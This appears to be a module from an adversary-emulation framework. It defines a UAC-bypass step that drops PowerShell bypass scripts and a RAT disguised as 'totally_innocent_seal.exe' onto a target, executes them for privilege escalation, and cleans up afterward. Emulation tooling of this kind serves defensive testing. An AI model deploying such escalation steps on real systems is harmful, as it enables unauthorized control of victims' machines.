import plugins.adversary.app.config as config
from plugins.adversary.app.commands import static
from plugins.adversary.app.operation.operation import Step, OPRat, OPFile


class AC_Bypass(Step):
    """
    Description:
        This attempts to bypass Window's Account Control mechanisms in various ways using powershell scripts.
        Specifically, it attempts to bypass UAC by performing an image hijack on the .msc file extension, and
        by abusing the lack of an embedded manifest in wscript.exe.
    Requirements:
        Requires a rat on the target machine.
    """
    attack_mapping = [('T1088', 'Privilege Escalation'), ('T1088', 'Defense Evasion')]
    display_name = "ac_bypass"
    summary = "Bypass Account Control to escalate privileges"

    preconditions = [("rat", OPRat)]
    postconditions = [("file_g", OPFile),
                      ("rat_g", OPRat({"elevated": True}))]

    preproperties = ["rat.host.fqdn"]

    significant_parameters = []

    @staticmethod
    def description():
        return "Using Account Bypass to escalate Privileges"

    @staticmethod
    async def simulate(operation, rat, file_g, rat_g):
        return True

    @staticmethod
    async def action(operation, rat, file_g, rat_g):
        await operation.drop_file(rat, "C://bypassB.ps1", config.settings.filestore_path + "/bypassTAR.hex")
        await operation.drop_file(rat, "C://totally_innocent_seal.exe", config.settings.exe_rat_path)
        ret = await operation.execute_shell_command(rat, *static.bypassB())
        if not ret:
            await operation.drop_file(rat, "C://bypassA.ps1", config.settings.filestore_path + "/bypassRAT.hex")
            await file_g({'path': "C://bypassA.ps1", 'host': rat.host, 'use_case': 'dropped'})
            await operation.execute_shell_command(rat, *static.bypassA())
        await file_g({'path': "C://bypassB.ps1", 'host': rat.host, 'use_case': 'dropped'})
        await file_g({'path': "C://totally_innocent_seal.exe", 'host': rat.host, 'use_case': 'dropped'})
        await rat_g()
        return True

    @staticmethod
    async def cleanup(cleaner, file_g):
        for entry in file_g:
            await cleaner.delete(entry)